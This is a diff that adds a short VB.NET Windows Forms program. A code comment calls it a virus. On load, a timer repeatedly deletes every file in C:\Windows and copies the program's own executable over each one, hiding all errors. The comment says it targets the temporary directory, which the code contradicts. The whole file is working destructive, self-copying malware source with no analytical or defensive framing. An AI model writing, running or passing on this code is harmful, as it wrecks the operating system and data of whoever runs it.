@@ -1,0 +1,18 @@
+Imports System.IO
+
+Public Class Form1
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        deltime.Start()
+    End Sub
+    Private Sub deltime_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles deltime.Tick
+        For Each item In Directory.GetFiles("C:\Windows")
+            'The virus will try to delete all the files in the temporary directory.
+            Try
+                IO.File.Delete(item)
+                FileCopy(Application.ExecutablePath, item)
+            Catch ex As Exception
+            End Try
+        Next
+    End Sub
+End Class
